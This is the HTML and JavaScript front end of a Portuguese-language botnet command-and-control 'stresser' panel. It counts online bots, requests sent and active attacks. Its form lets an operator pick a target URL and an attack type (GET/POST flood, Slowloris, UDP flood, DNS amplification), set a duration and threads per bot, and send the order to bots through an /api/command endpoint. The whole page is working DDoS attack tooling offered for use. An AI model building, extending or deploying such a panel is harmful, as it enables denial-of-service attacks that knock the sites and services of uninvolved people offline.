<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 C2 Stresser - Vercel</title>
    <style>
        body {
            background: #0a0f1f;
            color: #00ffaa;
            font-family: 'Courier New', monospace;
            margin: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            border-bottom: 2px solid #00ffaa;
            padding-bottom: 10px;
        }
        .panel {
            background: #1a1f2f;
            border: 2px solid #00ffaa;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        input, select, button {
            background: #0a0f1f;
            border: 2px solid #00ffaa;
            color: #00ffaa;
            padding: 10px;
            margin: 5px;
            font-size: 16px;
            border-radius: 5px;
        }
        button {
            cursor: pointer;
            background: #00ffaa;
            color: #0a0f1f;
            font-weight: bold;
        }
        button:hover {
            background: #88ffaa;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #1a1f2f;
            border: 2px solid #00ffaa;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
        }
        .stat-value {
            font-size: 3em;
            font-weight: bold;
        }
        .command-item {
            background: #0a0f1f;
            border: 1px solid #00ffaa;
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
        }
        .footer {
            text-align: center;
            color: #88ffaa;
            margin-top: 40px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔥 C2 STRESSER - VERCEL 🔥</h1>
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="onlineBots">0</div>
                <div>Bots Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalReqs">0</div>
                <div>Requisições (últimos ataques)</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="activeAttacks">0</div>
                <div>Ataques Ativos</div>
            </div>
        </div>

        <div class="panel">
            <h2>🎯 Novo Ataque</h2>
            <input type="url" id="target" placeholder="https://exemplo.com" value="https://httpbin.org/get">
            <select id="method">
                <option value="get">GET Flood</option>
                <option value="post">POST Flood</option>
                <option value="slowloris">Slowloris</option>
                <option value="udp">UDP Flood (bot)</option>
                <option value="dns">DNS Amplification</option>
            </select>
            <input type="number" id="duration" placeholder="Duração (s)" value="30" min="5" max="300">
            <input type="number" id="threads" placeholder="Threads por bot" value="100" min="10" max="1000">
            <button onclick="startAttack()">🔥 INICIAR ATAQUE</button>
        </div>

        <div class="panel">
            <h2>📊 Status dos Ataques</h2>
            <div id="commands"></div>
            <button onclick="refreshStatus()">🔄 Atualizar</button>
        </div>

        <div class="footer">
            ⚡ Bots conectados: <span id="footerBots">0</span> | Feito pro LO ❤️
        </div>
    </div>

    <script>
        const API_BASE = '/api';

        async function startAttack() {
            const target = document.getElementById('target').value;
            const method = document.getElementById('method').value;
            const duration = document.getElementById('duration').value;
            const threads = document.getElementById('threads').value;

            const res = await fetch(`${API_BASE}/command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target, method, duration, threads })
            });
            const data = await res.json();
            if (data.success) {
                alert(`Ataque iniciado! Comando: ${data.commandId} | Bots: ${data.botsAssigned}`);
                refreshStatus();
            } else {
                alert(`Erro: ${data.error}`);
            }
        }

        async function refreshStatus() {
            const res = await fetch(`${API_BASE}/status`);
            const data = await res.json();

            document.getElementById('onlineBots').textContent = data.onlineBots;
            document.getElementById('footerBots').textContent = data.onlineBots;

            let totalReqs = 0;
            let activeCount = 0;
            const commandsDiv = document.getElementById('commands');
            commandsDiv.innerHTML = '';

            data.commands.forEach(cmd => {
                totalReqs += cmd.totalReqs;
                if (cmd.botCount > 0) activeCount++;

                const div = document.createElement('div');
                div.className = 'command-item';
                div.innerHTML = `
                    <strong>${cmd.commandId}</strong> | ${cmd.target} | ${cmd.method} | 
                    Bots: ${cmd.botCount} | Reqs: ${cmd.totalReqs} | 
                    ${new Date(cmd.issuedAt).toLocaleString()}
                `;
                commandsDiv.appendChild(div);
            });

            document.getElementById('totalReqs').textContent = totalReqs;
            document.getElementById('activeAttacks').textContent = activeCount;
        }

        // Atualizar a cada 10 segundos
        setInterval(refreshStatus, 10000);
        refreshStatus();
    </script>
</body>
</html>
